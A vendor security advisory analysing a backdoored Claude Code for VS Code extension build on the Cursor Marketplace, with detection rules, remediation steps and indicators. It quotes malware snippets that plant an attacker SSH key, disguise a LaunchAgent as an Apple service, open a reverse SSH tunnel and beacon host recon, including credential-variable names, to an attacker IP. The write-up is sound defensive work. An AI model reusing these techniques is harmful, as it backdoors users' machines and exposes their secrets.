---
title: 'Official Claude Code Extension Compromise: Security Advisory | Phorion'
url: https://phorion.io/blog/offical-claude-code-vsx-compromise/
site_name: hackernews_api
content_file: hackernews_api-official-claude-code-extension-compromise-security
fetched_at: '2026-10-31T19:03:15.254084'
original_url: https://phorion.io/blog/offical-claude-code-vsx-compromise/
author: _chall
date: '2026-10-30'
published_date: '2026-10-30T00:00:00Z'
description: Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up …
tags:
- hackernews
- trending
---

## TL;DR

Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.

Organisations should immediately review their environments for use of Claude Code for VSCode2.1.312or2.1.313and engage incident response where use of the extension is discovered.

Update (31 October 2026):Cursor’s security noticenow identifies versions2.1.312and2.1.313distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only2.1.313; the affected-version guidance below has been updated accordingly.

Phorion has discovered a compromise of the officialClaude Code for VS Codeextension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions,2.1.312and2.1.313, from its marketplace.

While the implant includes setup and persistence logic formacOS, Linux, and Windows, we’re going to focus primarily onmacOSin this post, calling out the key differences and a few implementation bugs on the other platforms along the way.

The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.

Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user,systemsetup -getremoteloginprints an administrator-access error and exits with status0instead of returningOff. Because the script only tries to enable SSH if the output matchesOff, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.

In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.

## Infection Chain

### The Cursor Marketplace Extension

The compromisedextension.jsfile starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normalactivateanddeactivateexports, and UI code.

The injected prefix pulls in standard Node.js modules (child_process,fs,os,path,http, andcrypto) and executes as soon as Node loads the file, before the extension’s normalactivatecallback even runs. The user doesn’t need to interact with the extension for the payload to fire.

### Stage 1 - Preparing SSH Access

First, the payload makes sure~/.sshexists and appends an attacker-controlled Ed25519 public key to~/.ssh/authorized_keys, setting permissions to0700on the directory and0600on the file.

The key uses the commentsvc-telemetry. Before appending, the script checks whethersvc-telemetryis already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.

var
 sd 
=
 path.join(HOME, 
".ssh"
),

 ak 
=
 path.join(sd, 
"authorized_keys"
);

// ...

if
 (cur.indexOf(
"svc-telemetry"
) 
<
 
0
) {

 fs.appendFileSync(ak, PUB 
+
 
"\n"
);

 d.sshKey 
=
 
"added"

} 
else
 {

 d.sshKey 
=
 
"present"

}

Here,curholds the existing contents ofauthorized_keys, andPUBis the embedded attacker public key (redacted here).

With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:

* Linux:tries to enable and startsshdorsshviasystemctl, falling back toserviceand/etc/init.d/.
* macOS:checks Remote Login and, if it reportsOff, tries to enable it viasudo -n systemsetup -setremotelogin on.
* Windows:tries to install and start OpenSSH Server using PowerShell.

None of these steps include a privilege escalation exploit. Non-interactivesudo -nwill fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.

It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes/bin/sh, which isn’t going to get very far on a standard Windows install.

### A bug in the macOS SSH logic?

On macOS, the setup may run into problems before it even gets to thesudocommand. The script runssystemsetup -getremoteloginwithout elevation and tests the output against/Off/i. It only tries to enable Remote Login if the output containsOff:

// ...

else
 
if
 (PLAT 
===
 
"darwin"
) {

 
var
 rl 
=
 ex(
"systemsetup -getremotelogin 2>/dev/null"
, 
4000
);

 d.remoteLogin 
=
 rl;

 
if
 (
/Off/i
.test(rl)) {

 det(
"sudo -n systemsetup -setremotelogin on >/dev/null 2>&1"
);

 d.remoteLoginOn 
=
 
"tried"

 }

}

Notice that the second command (-setremotelogin on) usessudo -n, while the first command (-getremotelogin) doesn’t. When you runsystemsetup -getremoteloginas a standard user on macOS, you get this instead:

You need administrator access to run this tool... exiting!

systemsetuprefuses to read the setting without administrator privileges, prints the error to stdout, and exits with status0. The malware’sex()helper grabs stdout and returns it:

function
 ex(c, t) {

 
try
 {

 
return
 cp.execSync(c, {

 timeout
:
 t 
||
 
3000
,

 stdio
:
 [
"ignore"
, 
"pipe"
, 
"ignore"
],

 windowsHide
:
 
true

 }).toString().trim()

 } 
catch
 (e) {

 
return
 
""

 }

}

Because the output is"You need administrator access to run this tool... exiting!",/Off/i.test(rl)evaluates tofalse.

As a result, the script skips theifblock and never runssudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.

This bug can break the final step of the access chain.If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.

Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.

### Stage 2 - Establishing the Reverse SSH Tunnel

Next, the script sets up an outbound SSH connection to134.209.82[.]225as thetunneluser on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the commentsvc-telemetry-tun.

It’s worth keeping the two keys straight during an investigation:

* The public key added to~/.ssh/authorized_keys(svc-telemetry) lets the attacker log into the victim’s machine.
* The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.

The script writes this tunnel key to the OS temporary directory with a filename starting with.stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:

var
 kf 
=
 path.join(

 TMP,

 
".stk_"
 
+
 crypto.createHash(
"md5"
)

 .update(
String
(os.hostname()) 
+
 HOME).digest(
"hex"
).slice(
0
, 
10
)

);

// ...

var
 RF 
=
 (PLAT 
===
 
"win32"
) 
?
 
"\"*:0:localhost:22\""
 
:
 
"'*:0:localhost:22'"
;

The tunnel uses-R *:0:localhost:22for remote port forwarding. Passing0asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel tolocalhost:22on the victim’s machine:

Affected host -- outbound SSH tunnel --> External SSH server

Operator -- separate connection --> Server's allocated port

 |

 Through the existing tunnel

 |

 v

 Affected host's SSH:22

 |

 Login using the planted key

Because the tunnel runs with-N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.

The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled,known_hostsis ignored,BatchModeandIdentitiesOnlyare enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), andExitOnForwardFailureis turned on.

Ifautosshis installed, the script uses it; otherwise it falls back to standardssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, usingpgrepon Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.

### Stage 3 - Keeping Access Available

To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:

Platform
Artifacts
Persistence mechanism
Notes
Linux
~/.config/.smt
, 
~/.config/.smtk
Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an 
@reboot
 entry to the user’s crontab.
Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).
macOS
~/.config/.smt
, 
~/.config/.smtk
, 
~/Library/LaunchAgents/com.apple.sysmond.plist
Writes a user LaunchAgent that runs 
/bin/sh ~/.config/.smt
 with 
RunAtLoad
 and 
KeepAlive
 set to 
true
, then loads it via 
launchctl
.
Runs in the user context rather than as a root LaunchDaemon.
Windows
~/.config/smt.cmd
, 
~/.config/smtk
, 
%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd
Tries to create a scheduled task named 
SysMon
 running as 
SYSTEM
 on startup. If that fails, drops 
sysmon.cmd
 into the user’s Startup folder.
Creating a 
SYSTEM
 task requires admin privileges; the Startup folder fallback runs as the user at login.

On macOS and Linux, the~/.config/.smtscript has the tunnel private key embedded inside it and writes it out to~/.config/.smtkbefore starting the reconnection loop.

On macOS, the LaunchAgent disguises itself ascom.apple.sysmond.plistinside~/Library/LaunchAgents/:

<key>
Label
</key>

<string>
com.apple.sysmond
</string>

<!-- ... -->

<key>
RunAtLoad
</key>

<true/>

<key>
KeepAlive
</key>

<true/>

### Stage 4 - Host Recon

Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:

* Hostname, username, OS platform, and architecture
* Home directory, current working directory, and global Git email (git config --global user.email)
* Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
* Up to 40 environment variablenames(not values) matching/KEY|TOKEN|SECRET|PASS|AWS|GCP/i

The environment variable check usesObject.keys(process.env):

Object
.keys(process.env)

 .filter(
function
(k) {

 
return
 
/KEY|TOKEN|SECRET|PASS|AWS|GCP/i
.test(k)

 })

 .slice(
0
, 
40
)

Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.

To get the machine’s public IP, the script queriesifconfig[.]me, falling back toapi[.]ipify[.]org.

It then sends the JSON report via plaintext HTTP POST requests to/beaconon both134.209.82[.]225:8099and127.0.0.1:8099:

var
 r 
=
 http.request({

 host
:
 h,

 port
:
 p,

 path
:
 
"/beacon"
,

 method
:
 
"POST"
,

 timeout
:
 
3000
,

 headers
:
 {
"content-type"
:
 
"application/json"
}

}, 
function
(res) {

 res.resume()

});

// ...

r.write(JSON.stringify(d));

r.end()

Why it also sends a copy of the beacon to127.0.0.1:8099isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.

The beacon is scheduled once withsetTimeout(1.5 seconds after the initial setup runs) and discards any HTTP response withres.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.

## Detection Opportunities

From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.

### SSH Key and Configuration Changes

Because the malware appends to~/.ssh/authorized_keysdirectly using Node’sfs.appendFileSync, process-only rules watching for shell commands likeechoorteetouchingauthorized_keyswon’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper,Cursor Helper, etc.) creating or writing to~/.ssh/authorized_keys.

Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.

While you should also monitor forsystemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.

### User LaunchAgent Persistence

The persistence setup on macOS gives us a couple of strong signals:

* A non-Apple process writing a plist with acom.apple.*label (~/Library/LaunchAgents/com.apple.sysmond.plist).
* A LaunchAgent configured to execute/bin/shagainst a hidden script in the user’s home directory (~/.config/.smt).

Because the initial tunnel is spawned as a detached process andlaunchdlater manages.smtdirectly, the subsequentsshprocesses won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of.smtandcom.apple.sysmond.plistback to the IDE extension host makes it much easier to piece the chain together.

### SSH Tunnels and Follow-On Access

On the process and network side, look for:

* sshorautosshlaunched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from/tmp/.stk_*or~/.config/.smtk.
* Outbound SSH connections to134.209.82[.]225on port 22, alongside HTTP POST requests to134.209.82[.]225:8099(and connection attempts to127.0.0.1:8099).

If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come fromlocalhost(127.0.0.1or::1) authenticating with thesvc-telemetrykey.

### Remediation

If you identify an affected machine,uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:

1. Kill active tunnel processes:Terminate the/bin/shretry loop and anysshorautosshprocesses connecting to134.209.82[.]225.
2. Remove persistence:Unload and delete~/Library/LaunchAgents/com.apple.sysmond.pliston macOS (or clean up the@rebootcron entry on Linux /SysMonscheduled task and Startup script on Windows), and remove~/.config/.smtand~/.config/.smtk.
3. Clean up SSH keys and state:Remove thesvc-telemetrypublic key from~/.ssh/authorized_keys, delete/tmp/.stk_*, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.
4. Rotate credentials:If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching theKEY|TOKEN|SECRET|PASS|AWS|GCPenvironment variable filter).

## Phorion’s Approach

Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creatingcom.apple.*LaunchAgents and LaunchAgents executing shell scripts from hidden directories.

Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying~/.ssh/authorized_keysdirectly, andPhorion Protectionscan be used to lock down~/.ssh/so that only authorised processes can read or modify SSH keys and configuration files in the first place.

If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet,get in touch to arrange a demo.

## Indicators

### Sample and Public-Key Fingerprints

Indicator
Value
Notes
SHA-256
ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15
Backdoored 
extension.js
 bundle
Victim-login public-key fingerprint
SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk
Ed25519 key appended to 
~/.ssh/authorized_keys
 (comment 
svc-telemetry
)
Tunnel public-key fingerprint
SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ
Embedded Ed25519 key used to authenticate to the tunnel server (comment 
svc-telemetry-tun
)

### Network Indicators

Indicator
Type
Notes
134.209.82[.]225
 (TCP 
22
, user 
tunnel
)
IP / SSH
Outbound reverse SSH tunnel server
134.209.82[.]225:8099
 (
POST /beacon
)
IP / HTTP
External host-report beacon endpoint
127.0.0.1:8099
 (
POST /beacon
)
Loopback / HTTP
Local beacon destination
ifconfig[.]me
, 
api[.]ipify[.]org
Domain
Legitimate services queried for public IP discovery

### Host Artifacts

Artifact
Platform
Notes
~/.<ide>/extensions/anthropic.claude-code-2.1.312-darwin-arm64
macOS (Apple Silicon)
Additional affected version identified in Cursor’s security notice (
<ide>
 varies by editor)
~/.<ide>/extensions/anthropic.claude-code-2.1.313-darwin-arm64
macOS (Apple Silicon)
Installed extension directory (
<ide>
 varies by editor)
~/.ssh/authorized_keys
 (comment 
svc-telemetry
)
All
Planted Ed25519 public key
<TMP>/.stk_<10 hex chars>
 (
$TMPDIR/.stk_*
 on macOS)
All
Initial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of 
MD5(hostname + HOME)
)
~/.config/.smt
 and 
~/.config/.smtk
macOS, Linux
Persistence shell script and recreated tunnel private key
~/Library/LaunchAgents/com.apple.sysmond.plist
macOS
User LaunchAgent executing 
/bin/sh ~/.config/.smt
@reboot
 cron entry for 
~/.config/.smt
Linux
User crontab persistence
~/.config/smt.cmd
 and 
~/.config/smtk
Windows
Persistence batch script and tunnel private key
Scheduled task 
SysMon
Windows
Startup scheduled task (requests 
SYSTEM
)
%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd
Windows
Startup folder fallback script
Let's Talk

## See how Phorion protects your macOS fleet

Purpose-built by macOS security researchers. One lightweight agent delivering detection, prevention,
and visibility.

Ready to see it in action? Book a demo and we'll show you how Phorion can protect your fleet.

### Book a Demo

Name
*

Company
*

Email
*

Request Demo

Error

Expect a personal email from our team.